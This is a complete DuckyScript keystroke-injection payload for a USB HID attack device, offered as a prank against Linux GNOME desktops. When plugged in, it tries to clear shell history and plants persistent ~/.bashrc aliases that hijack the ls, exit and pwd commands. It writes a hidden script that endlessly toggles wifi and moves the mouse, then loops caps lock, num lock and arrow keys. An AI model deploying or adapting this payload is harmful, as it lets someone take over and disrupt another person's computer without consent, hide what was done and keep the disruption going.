REM TITLE: MOAA (Mother Of All Annoyances)
REM AUTHOR: OSINTI4L (https://github.com/OSINTI4L)
REM TARGET OS: Linux (tested on Pop!_OS) | Dependencies: `xdotool` (for mouse movement) and `gnome environment` (for terminal window spawning).
REM DESCRIPTION: See README.md

ATTACKMODE HID
REM kducky: initial DELAY 1000 reduced to 500 (1.25s HID delay built-in)
DELAY 500
CTRL ALT t
DELAY 300

REM Unsetting HISTFILE and adding aliases to shell environment:
STRINGLN unset HISTILE
STRINGLN cd ~ && cat >> .bashrc
STRINGLN alias ls="(~/./.MOAA.sh > /dev/null 2>&1 &)"
STRINGLN alias exit="(gnome-terminal)"
STRINGLN alias pwd="echo 'command not found'"
CTRL c

REM Creating MOAA.sh Bash script to control wifi toggling and mouse movement:
REM kducky: converted STRINGLN_BASH to individual STRINGLN statements
STRINGLN cat > .MOAA.sh
STRINGLN #!/bin/bash
STRINGLN while true
STRINGLN do
STRINGLN nmcli r wifi off
STRINGLN xdotool mousemove 300 0
STRINGLN sleep 2
STRINGLN xdotool mousemove 2000 200
STRINGLN sleep 2
STRINGLN nmcli r wifi on
STRINGLN xdotool mousemove 25 100
STRINGLN sleep 2
STRINGLN xdotool mousemove 1000 1000
STRINGLN sleep 2
STRINGLN done
CTRL c

REM Giving execution perms to MOAA.sh:
STRINGLN chmod +x ~/.MOAA.sh

REM Closing terminal window:
ALT SPACE
REM kducky: UP converted to UPARROW
UPARROW
REM kducky: HOLD DOWN converted to HOLD DOWNARROW
HOLD DOWNARROW
DELAY 350
ENTER

REM Beginning loop to toggle capslock, numlock, and move arrow keys up and down:
WHILE TRUE
CAPSLOCK
DELAY 1000
NUMLOCK
DELAY 1000
REPEAT 2 UPARROW
DELAY 1000
REPEAT 2 DOWNARROW
DELAY 1000
CAPSLOCK
DELAY 1000
NUMLOCK
DELAY 1000
END_WHILE